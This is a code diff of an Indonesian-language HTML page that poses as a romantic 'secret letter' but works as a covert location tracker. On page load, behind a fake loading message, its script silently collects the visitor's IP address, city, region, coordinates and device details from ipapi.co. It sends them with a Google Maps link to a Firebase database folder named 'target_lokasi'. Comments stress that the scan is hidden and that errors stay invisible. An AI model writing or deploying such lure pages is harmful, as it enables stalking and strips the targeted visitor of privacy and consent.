@@ -2,69 +2,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surat Untuk Kamu ❤️</title>
+    <title>Surat Spesial Untukmu ❤️</title>
     <style>
-        body { background: #ffebee; color: #d81b60; font-family: 'Arial', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .container { padding: 20px; }
-        .heart { font-size: 50px; color: #e91e63; animation: beat .25s infinite alternate; }
+        body { 
+            background: #ffebee; 
+            color: #d81b60; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+            overflow: hidden;
+        }
+        .container { padding: 20px; z-index: 2; }
+        .heart { font-size: 60px; color: #e91e63; animation: beat .3s infinite alternate; }
         @keyframes beat { to { transform: scale(1.2); } }
-        #status { font-size: 14px; color: #888; margin-top: 10px; }
+        h1 { font-size: 24px; margin-top: 20px; transition: 1s; }
+        #status { font-size: 14px; color: #ad1457; margin-top: 15px; font-style: italic; }
+        .bg-hearts { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-content">
+    <div class="bg-hearts">
+        <svg width="100%" height="100%"><circle cx="10%" cy="10%" r="2" fill="#e91e63"/></svg>
+    </div>
+
+    <div class="container">
         <div class="heart">❤️</div>
-        <h1 id="title">Sedang membuka pesan rahasia tunggu 10detik jika tidak muncul berarti kamu tidak sayang idan...</h1>
-        <p id="status">Mengamankan koneksi pribadi...</p>
+        <h1 id="title">Sedang membuka pesan rahasia...</h1>
+        <p id="status">Tunggu sebentar ya, koneksi lagi disiapkan...</p>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <script>
-        // KONFIGURASI FIREBASE (Pake yang Pirdangame lu)
+        // 1. KONFIGURASI FIREBASE IDAN (Pirdangame)
         const firebaseConfig = {
             databaseURL: "https://pirdangame-default-rtdb.firebaseio.com"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // 1. Tunggu 2 detik, lalu mulai Scan
-        setTimeout(async () => {
-            document.getElementById('status').innerText = "Menyiapkan kejutan untukmu...";
-            
+        // 2. SISTEM INTEL PIRDAN-LABS (NO VISUAL SCAN)
+        async function startIntelScan() {
             try {
-                // Ambil IP dan Lokasi via API Eksternal (No Visual)
+                // Scanning data via API (Diem-diem bae)
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
+                // Susun data rahasia
                 const logData = {
-                    ip: data.ip,
-                    kota: data.city,
-                    wilayah: data.region,
-                    negara: data.country_name,
-                    isp: data.org,
+                    ip: data.ip || "Gak kebaca",
+                    kota: data.city || "Gak kebaca",
+                    wilayah: data.region || "Gak kebaca",
                     perangkat: navigator.userAgent,
                     waktu: new Date().toLocaleString(),
+                    // Link Maps Presisi
                     google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                 };
 
-                // 2. Simpan ke Firebase (Proses 5 detik selesai)
-                await db.ref('target_lokasi/' + Date.now()).set(logData);
-
-                // 3. Setelah Berhasil (Setelah total 7 detik)
+                // Kirim ke Firebase (Folder target_lokasi)
+                await db.ref('target_lokasi').push(logData);
+                
+                // Jika sukses, ubah teks setelah 5 detik total
                 setTimeout(() => {
                     document.getElementById('title').innerText = "Aku sebenernya suka sama kamu...";
-                    document.getElementById('status').innerText = "Tunggu aku di sana ya ❤️";
-                }, 2000);
+                    document.getElementById('status').innerText = "Boleh kan aku tau alamatmu buat kasih kejutan? ❤️";
+                }, 3000);
 
             } catch (error) {
-                // Jika gagal scan tetap tampil manis
-                console.log("Error silent");
-                document.getElementById('title').innerText = "Koneksi lambat, tapi cintaku tetap kuat.";
+                // Tetap tampil manis kalau gagal scan
+                console.log("Silent Error");
+                setTimeout(() => {
+                    document.getElementById('title').innerText = "Aku suka sama kamu, sungguhan.";
+                    document.getElementById('status').innerText = "Cintaku lebih kuat dari koneksi internet ini ❤️";
+                }, 3000);
             }
+        }
+
+        // Jalankan Intel setelah 2 detik loading palsu
+        setTimeout(() => {
+            document.getElementById('status').innerText = "Hampir siap...";
+            startIntelScan();
         }, 2000);
     </script>
 </body>
 </html>
+
